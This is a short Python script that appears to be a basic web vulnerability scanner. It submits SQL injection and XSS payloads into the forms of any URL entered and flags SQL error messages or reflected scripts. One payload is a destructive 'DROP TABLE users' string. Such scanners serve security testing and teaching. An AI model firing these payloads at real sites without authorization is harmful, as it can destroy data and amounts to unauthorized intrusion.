import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# Common test payloads
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
xss_payloads = ["<script>alert('XSS')</script>", '"><img src=x onerror=alert(1)>']

# SQL error patterns to check
sql_errors = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated"
]

def get_forms(url):
    soup = BeautifulSoup(requests.get(url).text, "html.parser")
    return soup.find_all("form")

def form_details(form):
    details = {"action": form.get("action"), "method": form.get("method", "get").lower(), "inputs": []}
    for input_tag in form.find_all("input"):
        input_type = input_tag.get("type", "text")
        name = input_tag.get("name")
        if name:
            details["inputs"].append({"type": input_type, "name": name})
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text":
            data[input["name"]] = payload
        else:
            data[input["name"]] = "test"
    
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_sql_injection(url):
    forms = get_forms(url)
    vulnerable = False
    print(f"\n[+] Testing {url} for SQL Injection...")
    for form in forms:
        details = form_details(form)
        for payload in sql_payloads:
            res = submit_form(details, url, payload)
            for error in sql_errors:
                if error.lower() in res.text.lower():
                    print(f"[-] SQL Injection vulnerability detected on {url}")
                    print(f"    Payload: {payload}")
                    vulnerable = True
                    break
    return vulnerable

def scan_xss(url):
    forms = get_forms(url)
    vulnerable = False
    print(f"\n[+] Testing {url} for XSS...")
    for form in forms:
        details = form_details(form)
        for payload in xss_payloads:
            res = submit_form(details, url, payload)
            if payload in res.text:
                print(f"[-] XSS vulnerability detected on {url}")
                print(f"    Payload: {payload}")
                vulnerable = True
                break
    return vulnerable

if __name__ == "__main__":
    target = input("Enter target URL (e.g. http://testphp.vulnweb.com): ").strip()
    scan_sql_injection(target)
    scan_xss(target)
